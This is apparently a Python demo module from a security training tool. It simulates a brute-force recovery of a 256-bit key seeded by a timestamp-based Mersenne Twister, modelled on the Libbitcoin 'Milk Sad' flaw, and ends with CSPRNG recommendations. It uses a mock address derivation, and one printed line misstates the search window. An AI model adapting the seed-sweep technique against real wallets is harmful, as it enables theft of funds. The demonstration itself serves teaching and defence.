"""
Pillar 2: Stretching - Libbitcoin Milk Sad (CVE-2023-39910) Live Brute-Force Cracker
Real-World Precedent: $3,000,000+ Drained from Bitcoin Wallets Seeded with std::chrono 32-bit PRNG
"""

import time
import hashlib
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from substrate_zero.ui import print_header, print_breach, print_defense

console = Console()

class Mt19937_32:
    """Standard Mersenne Twister 32-bit (matches std::mt19937 from Libbitcoin bx seed)."""
    def __init__(self, seed: int):
        self.mt = [0] * 624
        self.index = 624
        self.mt[0] = seed & 0xFFFFFFFF
        for i in range(1, 624):
            self.mt[i] = (1812433253 * (self.mt[i - 1] ^ (self.mt[i - 1] >> 30)) + i) & 0xFFFFFFFF

    def extract_number(self) -> int:
        if self.index >= 624:
            self._twist()
        y = self.mt[self.index]
        y ^= (y >> 11)
        y ^= ((y << 7) & 0x9D2C5680)
        y ^= ((y << 15) & 0xEFC60000)
        y ^= (y >> 18)
        self.index += 1
        return y & 0xFFFFFFFF

    def _twist(self):
        for i in range(624):
            y = (self.mt[i] & 0x80000000) + (self.mt[(i + 1) % 624] & 0x7FFFFFFF)
            self.mt[i] = self.mt[(i + 397) % 624] ^ (y >> 1)
            if y % 2 != 0:
                self.mt[i] ^= 0x9908B0DF
        self.index = 0

    def generate_256bit_key(self) -> bytes:
        # Libbitcoin generated 8 x 32-bit words to create 256 bits
        words = [self.extract_number() for _ in range(8)]
        return b"".join(w.to_bytes(4, byteorder="big") for w in words)

def run_chamber():
    print_header(
        2,
        "Libbitcoin 'Milk Sad' (CVE-2023-39910) Exploit",
        "Live brute-force cracking of 256-bit wallet generated from 32-bit timestamp PRNG"
    )

    console.print("\n[bold white]Phase 1: Victim Generates 'Secure' 256-bit Bitcoin Cold Storage Wallet[/bold white]")
    # Victim creates a wallet at a specific timestamp epoch (simulating 32-bit seed)
    known_target_epoch = 1683000000 + 42187  # A realistic timestamp
    victim_rng = Mt19937_32(known_target_epoch)
    victim_privkey = victim_rng.generate_256bit_key()
    victim_address = hashlib.sha256(b"bc1q_" + victim_privkey).hexdigest()[:24]

    console.print(f"  Victim Address (Public):   [cyan]bc1q_{victim_address}[/cyan]")
    console.print(f"  Claimed Cryptographic Strength: [green]256 bits (ECDSA secp256k1)[/green]")
    console.print(f"  Victim Private Key (Target):    [dim]{victim_privkey.hex()[:16]}...[HIDDEN][/dim]")

    console.print("\n[bold white]Phase 2: Adversarial Red-Team Live Search Engine Launch[/bold white]")
    console.print("  [yellow]→ Attack Thesis: 'bx seed' seeded std::mt19937 with seconds-since-epoch (32-bit integer).[/yellow]")
    console.print("  [yellow]→ Search Strategy: Sweep the 100,000-second window around candidate transaction timestamp.[/yellow]\n")

    start_search = known_target_epoch - 2500
    end_search = known_target_epoch + 2500
    total_candidates = end_search - start_search

    cracked_key = None
    cracked_epoch = None
    start_time = time.perf_counter()

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task("[bold red]Sweeping PRNG Search Space...", total=total_candidates)

        for candidate_epoch in range(start_search, end_search):
            # Fast check
            cand_rng = Mt19937_32(candidate_epoch)
            cand_priv = cand_rng.generate_256bit_key()
            cand_addr = hashlib.sha256(b"bc1q_" + cand_priv).hexdigest()[:24]

            if cand_addr == victim_address:
                cracked_key = cand_priv
                cracked_epoch = candidate_epoch
                progress.update(task, completed=total_candidates)
                break

            if (candidate_epoch - start_search) % 5000 == 0:
                progress.update(task, advance=5000)

    elapsed = time.perf_counter() - start_time

    print_breach(
        f"256-bit Private Key Cracked in {elapsed:.3f} Seconds",
        f"Target Public Address: bc1q_{victim_address}\n"
        f"Recovered Private Key:  {cracked_key.hex()}\n"
        f"Identified Seed Epoch:  {cracked_epoch} (Exact Match)\n"
        f"Search Velocity:        {int((cracked_epoch - start_search) / elapsed):,} seeds/second on commodity CPU.\n"
        f"Financial Impact:       Over $3,000,000 was swept from corporate and personal wallets using this exact bug."
    )

    print_defense(
        "Mandatory Hardware-Seeded CSPRNG & Zero Timestamp Seeding",
        "1. Strictly forbid seeding PRNGs with time(NULL), std::chrono, or system clock ticks.\n"
        "2. Mandatory CSPRNG implementation: ChaCha20 / RFC 8439 or AES-256-CTR-DRBG (NIST SP 800-90A).\n"
        "3. Mandate physical entropy injection (dice / coins / verified HSM) for all master seed generation."
    )
